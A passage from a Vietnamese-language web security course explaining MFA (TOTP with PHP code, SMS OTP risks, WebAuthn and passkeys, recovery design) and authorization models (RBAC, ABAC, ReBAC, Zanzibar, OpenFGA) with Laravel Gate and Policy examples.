credential stuffing ở [module 2.9](#29-chống-lạm-dụng-rate-limit-brute-force-bot)). OWASP dẫn phân tích
của Microsoft rằng MFA chặn được 99,9% vụ chiếm tài khoản. OWASP cũng nhấn mạnh: MFA nào cũng hơn
không có MFA; các điểm yếu bên dưới chủ yếu liên quan tới tấn công có chủ đích.

Nên đòi MFA ở đâu (OWASP):

- Lúc đăng nhập, ở **mọi** lối vào: web, API đăng nhập riêng, mobile app. Lối vào bị quên là lối
  vòng qua MFA.
- Trước thao tác nhạy cảm (*step-up authentication*, xác thực lại khi leo quyền): đổi password, đổi
  email, tắt MFA, chuyển sang phiên admin.
- *Risk-based authentication* để đỡ phiền: chỉ hỏi MFA khi thiết bị mới, vị trí lạ.

#### TOTP

*TOTP* (Time-based One-Time Password, RFC 6238) là mã trong app như Google Authenticator. Nó là
*HOTP* (RFC 4226, OTP dựa trên bộ đếm) với bộ đếm lấy từ thời gian:

1. Lúc bật MFA, server sinh một *secret* ngẫu nhiên, hiển thị dạng QR (URI `otpauth://totp/...`
   chứa secret mã hoá base32). App quét QR và lưu secret. Từ đây **hai bên cùng giữ một secret**.
2. Bước thời gian `T = floor((unix_time - T0) / X)`, mặc định `T0 = 0`, `X = 30` giây.
3. `HMAC-SHA-1(secret, T)` (RFC cho phép SHA-256, SHA-512), rồi *dynamic truncation*: lấy 4 byte ở
   vị trí do 4 bit cuối của HMAC quyết định, bỏ bit dấu, chia lấy dư `10^6` để ra 6 chữ số.
4. Server tính lại theo cùng công thức và so sánh.

Chạy được bằng `php totp.php`; output đối chiếu với test vector trong RFC 6238 Appendix B (bảng RFC
ghi mã 8 chữ số, mã 6 chữ số là 6 chữ số cuối):

```php
<?php
declare(strict_types=1);

function totp(string $secret, int $unixTime, int $digits = 6, int $step = 30): string
{
    $counter = intdiv($unixTime, $step);                  // T0 = 0
    $hmac = hash_hmac('sha1', pack('J', $counter), $secret, true); // 'J' = 64 bit big-endian
    $offset = ord($hmac[19]) & 0x0F;                       // dynamic truncation
    $binary = ((ord($hmac[$offset]) & 0x7F) << 24)
        | (ord($hmac[$offset + 1]) << 16)
        | (ord($hmac[$offset + 2]) << 8)
        | ord($hmac[$offset + 3]);

    return str_pad((string) ($binary % 10 ** $digits), $digits, '0', STR_PAD_LEFT);
}

/**
 * Trả về bước thời gian đã khớp (để lưu lại), hoặc null nếu sai.
 * Chấp nhận lệch ±1 bước; từ chối mọi bước <= bước đã dùng lần trước (chống dùng lại).
 */
function verifyTotp(string $secret, string $code, int $now, ?int $lastUsedStep): ?int
{
    $current = intdiv($now, 30);
    foreach ([$current, $current - 1, $current + 1] as $step) {
        if ($lastUsedStep !== null && $step <= $lastUsedStep) {
            continue;
        }
        if (hash_equals(totp($secret, $step * 30), $code)) {  // so sánh thời gian hằng
            return $step;
        }
    }
    return null;
}

$secret = '12345678901234567890';                // secret mẫu của RFC 6238 (dạng bytes, chưa base32)
echo totp($secret, 59, 8), "\n";                 // 94287082
echo totp($secret, 1111111109, 8), "\n";         // 07081804
echo totp($secret, 1111111109), "\n";            // 081804

$step = verifyTotp($secret, '081804', 1111111109, null);
var_dump($step);                                 // int(37037036)
var_dump(verifyTotp($secret, '081804', 1111111115, $step)); // NULL, mã đã dùng
```

Các quy tắc triển khai:

- *Lệch đồng hồ*: RFC 6238 khuyến nghị cho phép tối đa **một** bước lệch do độ trễ mạng. Cửa sổ càng
  rộng thì mã đoán được hay mã lộ còn dùng được càng lâu.
- *Dùng một lần*: RFC 6238 nói verifier MUST NOT chấp nhận lại một mã đã xác thực thành công. Lưu bước
  thời gian cuối đã dùng cho từng user và từ chối mọi bước nhỏ hơn hoặc bằng (như code trên).
- *Giới hạn số lần thử*: 6 chữ số chỉ có một triệu khả năng; không rate limit là brute force được.
- *Secret phải mã hoá khi lưu* (không phải hash, vì server cần secret gốc để tính mã). Lộ secret là
  sinh được mọi mã về sau. Trong Laravel dùng cast `encrypted` của Eloquent (key management ở
  [module 3.3](#33-crypto-ứng-dụng-và-quản-lý-key)).
- So sánh bằng `hash_equals` để tránh *timing attack* (đo thời gian so sánh để đoán từng ký tự).
- Không log mã OTP.

⚠️ TOTP **không chống được phishing**: user gõ mã vào trang giả, trang giả dùng ngay mã đó ở trang
thật trong vòng 30 giây. Mã không biết nó đang được gõ vào domain nào.

Với OTP gửi qua kênh khác (SMS, email), OWASP khuyên thêm: TTL ngắn, dùng một lần, giới hạn số lần
thử, huỷ mã khi xác thực xong, bấm "gửi lại" thì sinh mã mới và ghi đè mã cũ, lưu hash (không phải để
chống brute force offline, vì không gian 6 chữ số quá nhỏ, mà để mã không lọt ra log, metrics, bản dump
DB).

#### SMS OTP

NIST SP 800-63B-4 xếp OTP qua SMS và cuộc gọi vào loại *restricted authenticator* (được dùng nhưng kèm
điều kiện: phải có ít nhất một lựa chọn thay thế không bị restricted, báo rõ rủi ro cho user, ghi rủi ro
vào tài liệu đánh giá rủi ro, và có kế hoạch chuyển đổi). OWASP khuyên không dùng SMS cho ứng dụng có dữ liệu
cá nhân hoặc rủi ro tài chính. Lý do:

- *SIM swap*: kẻ tấn công lừa nhà mạng chuyển số của nạn nhân sang SIM của hắn (hoặc chuyển mạng giữ
  số), từ đó nhận mọi SMS.
- Chặn trên hạ tầng viễn thông (lỗ hổng giao thức SS7), tin nhắn hiện trên màn hình khoá, app độc
  đọc SMS.
- Vẫn bị phishing như TOTP.
- *SMS pumping*: kẻ gian dùng form "gửi OTP" của bạn để bắn SMS tới dải số cước cao mà hắn ăn chia
  với nhà mạng. Bạn trả tiền. Cần rate limit theo số, theo IP, theo tiền tố quốc gia.

Nếu buộc phải dùng SMS: rate limit theo tài khoản, theo dõi tín hiệu đổi SIM hay đổi số, và có kế
hoạch chuyển sang TOTP hoặc passkey. Chi tiết thiết kế OTP (TTL, bảng lưu, chống spam) ở plan
[22-practical-data.md](../22-practical-data.md).

Email OTP còn yếu hơn: nó chỉ mạnh bằng hộp thư, mà hộp thư thường không bật MFA và dùng chung password
với app. OWASP ghi rằng còn tranh cãi việc email có được tính là một yếu tố MFA hay không.

#### WebAuthn và passkey

*WebAuthn* (W3C Web Authentication, bản hiện tại Level 3) là API của trình duyệt để đăng nhập bằng cặp
key công khai. Cùng với giao thức *CTAP* (trình duyệt nói chuyện với khoá bảo mật hay điện thoại), nó
tạo thành *FIDO2*. Các vai:

- *Relying Party* (RP): website của bạn, bên cần xác minh user.
- *Authenticator*: thứ tạo và giữ private key. *Platform authenticator* nằm sẵn trong thiết bị (Touch
  ID, Windows Hello, Android); *roaming authenticator* cắm hoặc chạm vào (YubiKey qua USB, NFC).
- *RP ID*: định danh của RP, là domain. Theo spec, RP ID phải **bằng hoặc là hậu tố domain đăng ký
  được** của origin. Trang ở `https://www.example.com` dùng được RP ID `example.com` hoặc
  `www.example.com`, không dùng được `other.com`.

*Passkey* (theo passkeys.dev) là tên thân thiện của một *discoverable credential* WebAuthn: credential
tự chứa đủ thông tin, nên user đăng nhập mà **không cần gõ username trước**. Hai loại:

| | Synced passkey | Device-bound passkey |
|---|---|---|
| Nằm ở | Credential manager đồng bộ giữa thiết bị (iCloud Keychain, Google Password Manager, password manager bên thứ ba) | Một authenticator duy nhất, không chuyển ra được |
| Ví dụ | Passkey trên iPhone tự có trên Mac | Passkey trên YubiKey |
| Mất thiết bị | Còn ở thiết bị khác cùng tài khoản đồng bộ | Mất luôn, cần credential dự phòng |
| Hợp với | Người dùng phổ thông | Nhân sự, tài khoản đặc quyền cao |

Dịch vụ đồng bộ không bao giờ xem hay dùng được private key (passkeys.dev).

Vì sao passkey là MFA gọn trong một bước: user phải **có** thiết bị (yếu tố sở hữu) và mở khoá nó bằng
vân tay, khuôn mặt hoặc PIN (yếu tố sinh trắc hoặc hiểu biết). Bước mở khoá gọi là *user verification*
(UV); còn *user presence* (UP) chỉ kiểm có người ở đó (ví dụ chạm vào khoá), không kiểm là ai.

Luồng đăng ký (*registration ceremony*):

```text
 Trình duyệt                           Server (RP)
 1. "Tạo passkey" ───────────────────> sinh challenge ngẫu nhiên, lưu vào session
                <── options: challenge, rp.id = "example.com", user.id (id ngẫu nhiên, không phải email),
                    pubKeyCredParams (thuật toán chấp nhận), excludeCredentials (key user đã có)
 2. navigator.credentials.create(options)
    authenticator hỏi vân tay/PIN, tạo cặp key cho đúng rp.id này
 3. gửi credential id, public key, clientDataJSON, attestationObject ─> kiểm tra (danh sách dưới)
                                                                       lưu credential record
```

Luồng đăng nhập (*authentication ceremony*):

```text
 1. "Đăng nhập" ─────────────────────> sinh challenge mới, lưu session
                <── challenge, rpId (có thể kèm allowCredentials)
 2. navigator.credentials.get(options)
    trình duyệt chỉ đưa ra credential của đúng rpId; user mở khoá; authenticator ký
 3. gửi credential id, authenticatorData, clientDataJSON, signature ─> verify, cập nhật signCount
```

Server kiểm tra những gì (WebAuthn Level 3 mục 7.1 và 7.2, rút gọn):

1. `clientDataJSON.type` là `webauthn.create` (đăng ký) hoặc `webauthn.get` (đăng nhập).
2. `clientDataJSON.challenge` khớp challenge server vừa phát (dùng một lần, chống phát lại).
3. `clientDataJSON.origin` là origin mình mong đợi.
4. `rpIdHash` trong authenticator data bằng SHA-256 của RP ID của mình.
5. Cờ UP được bật (ngoại lệ: đăng ký kiểu *conditional create* của Level 3 được phép không có UP); nếu chính sách đòi UV thì cờ UV phải bật.
6. Đăng nhập: chữ ký hợp lệ trên `authenticatorData || SHA-256(clientDataJSON)` bằng public key đã
   lưu. Đăng ký: thuật toán của public key thuộc danh sách mình cho phép, credential id chưa được đăng
   ký cho user nào (và không quá 1023 byte), attestation hợp lệ nếu chính sách yêu cầu.
7. Kiểm tra `signCount` (dưới).

Server lưu gì (*credential record*): credential id, **public key**, `signCount`, transports (USB, NFC,
internal...), cờ *backup eligible* và *backup state* (credential có thể đồng bộ không, đang được sao
lưu chưa), và `uvInitialized`. Thêm tên gợi nhớ do user đặt ("MacBook công ty") để quản lý. Không có
secret nào: DB bị lấy mất thì kẻ tấn công chỉ có public key, không đăng nhập được. So với password
hash ([module 1.1](#11-lưu-password)) và TOTP secret, đây là khác biệt rất lớn.

*Sign counter*: bộ đếm authenticator tăng sau mỗi lần ký, giúp phát hiện credential bị **nhân bản**.
Nếu một trong hai giá trị (đã lưu và mới nhận) khác 0 mà giá trị mới không lớn hơn giá trị đã lưu, spec
gọi đây là "tín hiệu, không phải bằng chứng" của nhân bản (cũng có thể do authenticator lỗi hoặc xử lý
các response không theo thứ tự). Có từ chối hay không là chính sách của RP. Authenticator không hỗ trợ
bộ đếm thì luôn trả 0, và khi cả hai đều 0 thì bỏ qua bước này.

⚠️ Với *synced passkey*, bộ đếm gần như vô dụng. Private key được sao chép sang nhiều thiết bị một
cách có chủ đích, nên không có một bộ đếm chung tăng dần; trên thực tế các credential manager đồng bộ
phổ biến (iCloud Keychain, Google Password Manager) trả `signCount` bằng 0 ở mọi lần ký, và thế là rơi
vào nhánh "cả hai đều 0, bỏ qua". Đừng thiết kế chính sách kiểu "counter không tăng thì từ chối" với
giả định mọi passkey đều có counter; coi counter là tín hiệu rủi ro phụ, chủ yếu có ý nghĩa với
credential chỉ nằm trên một thiết bị (cờ *backup eligible* bằng 0, ví dụ khoá bảo mật phần cứng).

⚠️ Vì sao passkey chống phishing còn TOTP thì không. Có hai lớp:

1. Trình duyệt chọn credential theo RP ID của **trang đang mở**. Trên `g00gle.com`, trình duyệt không
   hề đưa ra passkey của `google.com`, nên user không thể "đưa nhầm" dù có tin trang giả.
2. Kể cả trang giả làm proxy (AiTM) chuyển tiếp challenge thật, `clientDataJSON` do **trình duyệt**
   điền `origin` là `https://g00gle.com`, và chữ ký phủ lên cả trường đó. Server thật thấy origin sai
   và từ chối. Kẻ tấn công không sửa được origin mà không làm hỏng chữ ký.

Với TOTP, mã chỉ là 6 chữ số không mang thông tin gì về nơi nó được gõ vào. Việc bảo vệ chuyển từ
"user phải tự nhận ra trang giả" sang "trình duyệt và mật mã tự thực thi".

Triển khai ở PHP: đừng tự viết phần parse CBOR, attestation và verify chữ ký. Dùng thư viện như
`web-auth/webauthn-framework` (thư viện PHP kèm Symfony bundle). Phần của bạn là: sinh và lưu
challenge, cấu hình RP ID và origin, lưu credential record, và quyết định chính sách (có đòi UV không,
xử lý signCount thế nào).

#### Khôi phục và các cạm bẫy

*Luồng khôi phục thường là điểm yếu nhất*. OWASP: cơ chế để user lấy lại tài khoản khi mất yếu tố thứ
hai là cần thiết, nhưng nó không được trở thành đường tắt cho kẻ tấn công. ⚠️ MFA chặt mà "mất thiết
bị? nhập email là tắt MFA" thì MFA chỉ mạnh bằng hộp thư.

Các lựa chọn OWASP liệt kê, từ phổ biến tới nặng:

- *Recovery code*: phát một bộ mã dùng một lần khi user bật MFA. Lưu **hash** của từng mã (như
  password, vì mã đủ dài và ngẫu nhiên), đánh dấu đã dùng, cho user tạo lại bộ mới.
- Yêu cầu đăng ký nhiều yếu tố: hai passkey (điện thoại và laptop, hoặc thêm một YubiKey dự phòng),
  hoặc passkey cộng TOTP, để khó mất tất cả cùng lúc.
- Gửi mã khôi phục qua đường bưu điện tới địa chỉ đã đăng ký.
- Liên hệ support với quy trình xác minh danh tính chặt.
- Một người dùng tin cậy khác (ví dụ admin của tổ chức) bảo lãnh.

Thiết kế khôi phục khi mất thiết bị mà không mở cửa sau, gom lại:

1. Ưu tiên yếu tố dự phòng đã đăng ký sẵn (passkey thứ hai, recovery code). Đây là đường chính.
2. Không có dự phòng: quy trình chậm có chủ đích. Gửi thông báo tới mọi kênh đã biết, chờ một khoảng
   (ví dụ vài ngày) để chủ thật kịp phản ứng nếu không phải họ yêu cầu, xác minh danh tính qua support.
3. Sau khi khôi phục: huỷ mọi session và refresh token ([module 2.2](#22-vòng-đời-token-revocation-refresh-nơi-lưu-bff)),
   bắt đăng ký lại MFA, ghi audit log.

Đổi yếu tố MFA (thêm số điện thoại mới, thay app TOTP, thay khoá) cũng là thao tác rủi ro cao (OWASP):
bắt xác thực lại bằng một yếu tố **đang có**, không tin riêng session hiện tại (session có thể đã bị
chiếm), thông báo qua kênh khác, và cân nhắc độ trễ với tài khoản giá trị cao. Nếu không, kẻ chiếm
được session sẽ lặng lẽ thay MFA của nạn nhân bằng MFA của hắn và khoá chủ thật ra ngoài.

Khi user nhập đúng password nhưng sai yếu tố thứ hai, OWASP khuyên: gợi ý phương thức khác, cho phép
khôi phục, và **thông báo** cho user (thời gian, trình duyệt, vị trí), vì có thể password đã lộ.

⚠️ *MFA fatigue* (push bombing): kẻ đã có password gửi liên tục thông báo "Bạn có đang đăng nhập không?"
cho tới khi user bấm "Đồng ý" cho yên. Chống bằng *number matching* (màn hình đăng nhập hiện một số,
user phải gõ số đó vào app, nên không thể duyệt mù), giới hạn số push trong một khoảng thời gian, và
theo dõi bất thường.

⚠️ *MFA downgrade*: có passkey nhưng vẫn để lối "đăng nhập bằng SMS" hay một endpoint API cũ không đòi
MFA. Kẻ tấn công chọn lối yếu nhất. OWASP: tắt các lối cũ không thực thi được MFA, không cho tụt từ
phương thức chống phishing xuống phương thức yếu hơn trừ khi chính sách cho phép có ghi nhận.

⚠️ MFA không chặn được:

- *Session hijack*: MFA bảo vệ lúc đăng nhập. Trộm được session cookie **sau** khi user đăng nhập
  xong (qua XSS, malware đọc profile trình duyệt) là vào thẳng, không gặp MFA nào.
- *AiTM* (Adversary-in-the-Middle): trang phishing làm reverse proxy (OWASP nêu các framework như
  Evilginx, Modlishka, Muraena), chuyển tiếp password và OTP tới site thật theo thời gian thực, rồi
  lấy luôn **session cookie** mà site thật trả về. Password + TOTP hay SMS đều thua.

Passkey chặn được AiTM, vì origin trong chữ ký là của trang giả (lớp 2 ở trên). Nhưng passkey vẫn không
chặn session hijack sau đăng nhập; phần đó cần session ngắn, gắn session với thiết bị, phát hiện bất
thường (IP, ASN đổi đột ngột), và xác thực lại trước thao tác nhạy cảm.

Tổng hợp so sánh:

| Phương thức | Chống phishing, AiTM | Server lộ DB thì sao | Rủi ro chính |
|---|---|---|---|
| SMS OTP | Không | Không liên quan (mã ngắn hạn) | SIM swap, SMS pumping, chặn tin |
| Email OTP | Không | Không liên quan | Hộp thư yếu |
| TOTP | Không | Lộ secret là sinh được mọi mã (nên mã hoá) | Phishing thời gian thực |
| Push có number matching | Không hoàn toàn | Tuỳ hệ | Social engineering |
| Passkey / khoá FIDO2 | Có (gắn origin) | Chỉ lộ public key | Luồng khôi phục yếu, session hijack sau đăng nhập |

**Tóm tắt nhanh**
- MFA là nhiều **loại** yếu tố, độc lập nhau. Đòi ở mọi lối đăng nhập và trước thao tác nhạy cảm.
- TOTP: HMAC(secret, thời gian / 30 giây), cho lệch tối đa một bước, không chấp nhận lại mã đã dùng,
  rate limit, secret mã hoá khi lưu.
- SMS là authenticator "restricted" theo NIST: SIM swap, SMS pumping. Không dùng cho hệ có tiền hay dữ
  liệu cá nhân.
- Passkey chống phishing vì trình duyệt chọn key theo RP ID và ghi origin vào dữ liệu được ký; server
  chỉ lưu public key, credential id, signCount.
- Luồng khôi phục và đổi yếu tố MFA mới là điểm bị nhắm: recovery code lưu hash, yếu tố dự phòng,
  xác thực lại bằng yếu tố đang có, thông báo qua kênh khác.

**Nguồn**: [passkeys.dev](https://passkeys.dev/) ·
[passkeys.dev: Terms](https://passkeys.dev/docs/reference/terms/) ·
[W3C WebAuthn Level 3](https://www.w3.org/TR/webauthn-3/) ·
[OWASP: Multifactor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) ·
[RFC 6238: TOTP](https://www.rfc-editor.org/rfc/rfc6238) ·
[web-auth/webauthn-framework](https://github.com/web-auth/webauthn-framework)


---

### 2.5 Authorization: mô hình và tầng kiểm tra

Module này trả lời: khi app có nhiều vai trò, chi nhánh, chia sẻ lồng nhau thì chọn mô hình quyền
nào (RBAC, ABAC, ReBAC), đặt kiểm tra quyền ở tầng nào để không đường nào đi vòng qua được, và dùng
Gate/Policy của Laravel sao cho không tự bắn vào chân.

Nhắc lại từ [module 1.5](#15-authentication-authorization-và-idor): authentication là "bạn là ai",
authorization là "bạn được làm gì với **đúng object này**". NIST định nghĩa authorization là quá
trình xác minh một hành động được yêu cầu "is approved for a specific entity" (trích theo OWASP
Authorization Cheat Sheet). Module này đi tiếp từ câu hỏi "đơn có thuộc user không" lên câu hỏi
thiết kế: quyền được mô hình hoá thế nào, và kiểm tra ở đâu.

#### Ba mô hình

*RBAC* (Role-Based Access Control): quyền không gắn thẳng vào user mà gắn vào *role* (vai trò);
user được gán một hoặc nhiều role và thừa hưởng quyền của các role đó. Quan hệ user và role thường
là nhiều-nhiều, role có thể phân cấp (`manager` bao gồm quyền của `staff`).

```
user An ──► role editor ──► quyền: post.create, post.update
user Bình ─► role admin ──► quyền: mọi thứ
```

*ABAC* (Attribute-Based Access Control): quyết định tính từ **thuộc tính** (attribute, cặp tên và
giá trị) của ba phía:
- Subject (người gọi): phòng ban, chi nhánh, đã hoàn thành đào tạo bắt buộc chưa.
- Object (tài nguyên): chi nhánh sở hữu, trạng thái, ngày tạo, mức độ nhạy cảm.
- Môi trường: giờ trong ngày, IP, loại thiết bị, vị trí.

Ví dụ OWASP đưa ra: nhân viên sales được truy cập DB khách hàng từ mạng nội bộ trong giờ làm việc,
nhưng không phải từ nhà lúc nửa đêm. RBAC thuần không diễn đạt được câu này, vì role không biết giờ
và IP.

*ReBAC* (Relationship-Based Access Control): quyết định tính từ **quan hệ** giữa các đối tượng, tạo
thành một đồ thị. "Người tạo bài được sửa bài", "thành viên của folder cha được xem file con",
"bạn bè được xem ảnh". Hợp với mạng xã hội và kho tài liệu có chia sẻ.

Mô hình dữ liệu của ReBAC, theo paper Zanzibar (Google, USENIX ATC 2019), là các *relation tuple*
dạng `object#relation@user`, trong đó `user` có thể là một user id hoặc một *userset* (tập user,
ví dụ "mọi member của group eng"):

```
doc:readme#owner@10                    user 10 là owner của doc:readme
group:eng#member@11                    user 11 là member của group:eng
doc:readme#viewer@group:eng#member     mọi member của group:eng là viewer của doc:readme
doc:readme#parent@folder:A#...         doc:readme nằm trong folder:A
```

Tuple chỉ lưu quan hệ **trực tiếp**. Quan hệ suy ra được khai một lần trong cấu hình của từng
namespace (loại object) bằng *userset rewrite*, thay vì lưu một tuple cho mỗi object:
- `computed_userset`: "mọi owner cũng là editor, mọi editor cũng là viewer" trên cùng object.
- `tuple_to_userset`: "tìm folder cha của document, lấy viewer của folder đó làm viewer của
  document". Đây là cách biểu diễn kế thừa quyền theo cây thư mục.
- Các biểu thức con kết hợp được bằng union, intersection, exclusion.

Câu hỏi quyền luôn có dạng "user U có relation R với object O không?". Server trả lời bằng cách đi
theo đồ thị, có thể đệ quy qua nhiều tầng group lồng nhau. Paper mô tả Zanzibar phục vụ Calendar,
Cloud, Drive, Maps, Photos, YouTube, lưu hơn hai nghìn tỷ ACL, với độ trễ p95 (95th percentile) dưới
10 ms.

Hai ý senior hay được hỏi từ paper:
- Bài toán *new enemy*: Alice gỡ Bob khỏi folder, rồi thêm tài liệu mới vào folder. Nếu check quyền
  đọc dữ liệu ACL cũ (replica trễ), Bob vẫn thấy tài liệu mới. Zanzibar giải bằng *zookie*: token
  mờ (opaque) mã hoá một timestamp, client lưu kèm phiên bản nội dung và gửi lại khi check, để check
  được đánh giá trên snapshot ít nhất mới bằng thời điểm đó.
- Bài học chung: hệ thống phân quyền tập trung cũng là hệ thống phân tán, có vấn đề nhất quán như
  cache và replica.

*OpenFGA* là một hiện thực mã nguồn mở theo ý tưởng Zanzibar (dự án thuộc CNCF). Khái niệm chính:
*type* (loại object), *relation*, *relationship tuple* `{user, relation, object}`, *authorization
model* (tập type definition), và các API `Check` (có quan hệ không), `ListObjects` (user xem được
những object nào), `ListUsers`. Model viết bằng DSL:

```
model
  schema 1.1
type user
type folder
  relations
    define viewer: [user]
type document
  relations
    define parent: [folder]
    define owner: [user]
    define editor: [user] or owner
    define viewer: [user] or editor or viewer from parent
```

Đọc là: viewer của document gồm người được gán trực tiếp, mọi editor (mà editor gồm cả owner), và
mọi viewer của folder cha. OpenFGA còn có *condition* viết bằng CEL (Common Expression Language)
gắn vào tuple, tức pha thêm một chút ABAC vào ReBAC.

| Mô hình | Quyết định dựa trên | Ví dụ | Hợp khi | Điểm yếu |
|---|---|---|---|---|
| RBAC | Role của user | `admin`, `editor` | Quyền theo chức danh, ít ngoại lệ | Nổ số role; không diễn đạt được "của mình" |
| ABAC | Thuộc tính user, resource, môi trường | "Sửa đơn của chi nhánh mình, trong giờ làm việc" | Quy tắc động, nhiều điều kiện | Khó liệt kê "user này xem được những gì" |
| ReBAC | Quan hệ trong đồ thị | "Xem file nếu là thành viên folder cha" (Zanzibar, OpenFGA) | Chia sẻ, phân cấp lồng nhau | Thêm một service và dữ liệu tuple phải đồng bộ |

⚠️ *Role explosion* (nổ số role): mỗi ngoại lệ lại đẻ ra một role mới (`editor_hanoi`,
`editor_hanoi_readonly`, `editor_hanoi_readonly_weekend`...). Hệ quả OWASP nêu: khó test và audit,
dễ quên hoặc sai một check kiểu `hasAnyRole('SUPERUSER', 'ADMIN', 'ACCT_MANAGER')`, và nếu nhét
role vào header hay token thì có thể vượt giới hạn kích thước. OWASP Authorization Cheat Sheet
khuyến nghị nên ưu tiên ABAC và ReBAC hơn RBAC cho phát triển ứng dụng.

Thực tế phần lớn app Laravel dùng **RBAC kết hợp kiểm tra ownership** (một dạng ABAC đơn giản):
role quyết định "được dùng chức năng sửa đơn không" (chống BFLA), còn điều kiện
`$order->user_id === $user->id` hay `$order->branch_id === $user->branch_id` quyết định "được sửa
**đơn này** không" (chống BOLA). Khi nào nghĩ tới ReBAC thật sự: khi có chia sẻ tuỳ ý giữa user và
kế thừa theo cây (kiểu Google Drive), vì viết bằng SQL sẽ là truy vấn đệ quy khó cache.

Áp dụng cho hai đề bài trong plan:
- "CRM có 5 vai trò": RBAC cho chức năng, cộng điều kiện thuộc tính (chi nhánh, người phụ trách)
  cho từng bản ghi. Không cần hệ thống riêng.
- "Google Drive thu nhỏ": ReBAC, vì quyền xem file suy ra từ folder cha, từ nhóm, từ link chia sẻ.

#### Kiểm tra ở tầng nào

Nguyên tắc nền từ OWASP:
1. Kiểm tra quyền phải ở **server** (hoặc gateway, serverless function). Kiểm tra ở client chỉ để
   ẩn nút cho đẹp UI; kẻ tấn công gọi thẳng `curl` là qua.
2. *Deny by default*: không có luật nào khớp thì từ chối. Đừng dựa vào mặc định của framework mà
   hãy cấu hình rõ, vì mặc định có thể đổi giữa các phiên bản.
3. Kiểm tra **mọi request**, cho **đúng object** được truy cập. Có quyền với một loại object không có
   nghĩa là có quyền với mọi object loại đó.
4. Cơ chế nên áp được ở mức toàn app (middleware, filter) thay vì nhớ gắn từng method. Kẻ tấn công
   chỉ cần một chỗ quên.
5. Kiểm tra thất bại thì thoát an toàn: xử lý tập trung, không để app rơi vào trạng thái lửng, không
   lộ log hay debug trong thông báo lỗi.
6. Ghi log các lần bị từ chối, và viết unit/integration test cho logic quyền.

Chia việc giữa các tầng:

```
Request ──► Gateway / middleware ──► Controller ──► Service / domain ──► DB
            - xác thực token          - gọi Policy     - quyền trên từng object
            - quyền thô: có scope     cho request      (chỉ tầng này biết object
              "orders:write" không?   HTTP              thuộc ai, trạng thái gì)
```

- Gateway hoặc middleware: xác thực, và quyền thô không cần biết object (token có scope này không,
  user có role này không). Rẻ, chặn sớm.
- Service hoặc domain: quyền trên từng object, vì phải load object mới biết nó thuộc ai, thuộc chi
  nhánh nào, đang ở trạng thái nào (đơn đã thanh toán thì không được sửa).

⚠️ Chỉ kiểm tra ở controller HTTP thì những đường vào khác đi vòng qua được:
- Job trong queue: job chạy trong worker, không có request, không có user đăng nhập. Nếu job nhận
  `order_id` từ payload do user gửi lên lúc dispatch mà không kiểm tra lại, đó là đường vòng.
- Artisan command: chạy với toàn quyền, ai được chạy lệnh là làm được mọi thứ.
- GraphQL resolver: mỗi field, mỗi quan hệ lồng nhau là một đường truy cập dữ liệu. Chặn ở
  endpoint `/graphql` chưa đủ, `order { customer { orders { ... } } }` có thể lấy dữ liệu người khác.
- Consumer đọc message từ queue (Kafka, RabbitMQ): message có thể do service khác hoặc kẻ đã chiếm
  được một service đẩy vào.
- Thêm: endpoint mới viết mà quên gắn middleware, route API bản cũ (`/v1/`) vẫn chạy (OWASP API9).

Cách làm: đặt logic quyền ở **một chỗ** và gọi từ mọi đường vào.
- Laravel: Gate và Policy. Trong job hoặc command không có user hiện tại thì dùng
  `Gate::forUser($user)->authorize('update', $order)` với user lấy từ payload đã tin cậy.
- Java: Spring Security, ví dụ `@PreAuthorize("hasRole('ADMIN')")` gắn lên method của service, nên
  mọi đường gọi method đó đều bị kiểm tra (không chỉ controller).
- Go: không có framework chuẩn; thường là middleware tự viết cho quyền thô, cộng hàm kiểm tra gọi
  trong service cho quyền trên object.

Đối chiếu: Laravel Policy và Spring `@PreAuthorize` đều tách "luật" ra khỏi "chỗ gọi". Khác biệt
là Policy chỉ chạy khi bạn gọi nó, còn `@PreAuthorize` chạy tự động qua proxy mỗi khi method được
gọi (với điều kiện bật method security và gọi qua bean, không phải gọi nội bộ `this.method()`).

#### Gate và Policy trong Laravel

Tài liệu Laravel ví Gate và Policy như route và controller: Gate là closure đơn lẻ, Policy là class
gom luật quanh một model. App thường dùng cả hai.

- *Gate*: cho quyền không gắn với model cụ thể, ví dụ "xem dashboard báo cáo". Khai trong
  `boot()` của `AppServiceProvider`.
- *Policy*: class cho quyền theo model, ví dụ `OrderPolicy::update(User $user, Order $order)`. Tạo
  bằng `php artisan make:policy OrderPolicy --model=Order` (sinh sẵn `viewAny`, `view`, `create`,
  `update`, `delete`, `restore`, `forceDelete`).
  - Laravel tự tìm Policy theo quy ước tên: model `Order` ứng với `OrderPolicy` trong thư mục
    `Policies` nằm trong thư mục chứa model hoặc ở một thư mục cấp trên (với model ở
    `app/Models`, Laravel tìm ở `app/Models/Policies` rồi `app/Policies`). Không theo quy ước thì
    đăng ký bằng `Gate::policy(Order::class, OrderPolicy::class)` hoặc attribute
    `#[UsePolicy(OrderPolicy::class)]` trên model.

```php
<?php

declare(strict_types=1);

namespace App\Policies;

use App\Models\Order;
use App\Models\User;
use Illuminate\Auth\Access\Response;

final class OrderPolicy
{
    // Chạy trước mọi method của policy này. null nghĩa là "không ý kiến, xét tiếp".
    public function before(User $user, string $ability): ?bool
    {
        return $user->is_super_admin === true ? true : null;
    }

    public function update(User $user, Order $order): Response
    {
        if ($order->user_id !== $user->id) {
            // Trả 404 thay vì 403 để không xác nhận "đơn này tồn tại"
            return Response::denyAsNotFound();
        }

        return $order->status === 'pending'
            ? Response::allow()
            : Response::deny('Đơn đã xử lý, không sửa được.');
    }
}
```

- `before`:
  - `Gate::before(...)` chạy trước **mọi** kiểm tra của cả app. Method `before` trong một Policy chỉ
    chạy trước các method của Policy đó.
  - Trả về giá trị khác `null` thì giá trị đó là kết quả cuối, policy method không được gọi nữa.
    Trả `null` thì đi tiếp vào policy method.
  - ⚠️ Trả `true` ở đây là bỏ qua mọi luật, kể cả luật nghiệp vụ như "đơn đã thanh toán không được
    sửa". Super admin cũng sửa được đơn đã khoá sổ. Nếu có luật nghiệp vụ bắt buộc cho cả admin,
    đừng đặt nó trong Policy mà để ở domain.
  - ⚠️ Viết `return false` thay vì `return null` cho user thường là **khoá tất cả** mọi quyền của họ.
  - ⚠️ `before` trong Policy không chạy nếu Policy không có method trùng tên ability đang được kiểm
    tra (tài liệu Laravel có cảnh báo riêng).
- `Gate::after`: chạy sau mọi kiểm tra; giá trị trả về chỉ ghi đè kết quả khi gate hoặc policy trả
  `null`.
